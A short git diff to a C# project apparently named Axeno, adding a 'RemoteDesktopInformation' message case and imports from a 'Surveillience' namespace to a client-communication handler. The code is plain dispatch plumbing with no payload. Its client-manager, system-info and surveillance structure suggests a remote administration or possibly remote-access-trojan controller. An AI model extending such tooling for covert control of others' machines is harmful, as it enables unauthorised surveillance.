@@ -11,6 +11,8 @@ using Axeno.Helper;
 using System.Web.Configuration;
 using Axeno.Views.Pages.MainWindow;
 using System.Windows.Threading;
+using Axeno.Views.Pages.ClientManager;
+using Axeno.Networking.Functions.Surveillience;
 
 namespace Axeno.Networking.Communication
 {
@@ -46,6 +48,17 @@ namespace Axeno.Networking.Communication
 
                                 client.SysInfo.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => {
                                     new HandleSysInfo().InsertInformation(client, msgpck);
+                                }));
+                            });
+                            break;
+                        }
+                    case "RemoteDesktopInformation":
+                        {
+                            ThreadPool.QueueUserWorkItem(delegate
+                            {
+
+                                client.Rdp.Dispatcher.Invoke(DispatcherPriority.Normal, new Action(() => {
+                                     new RemoteDesktopFunction().Handle(client, msgpck);
                                 }));
                             });
                             break;
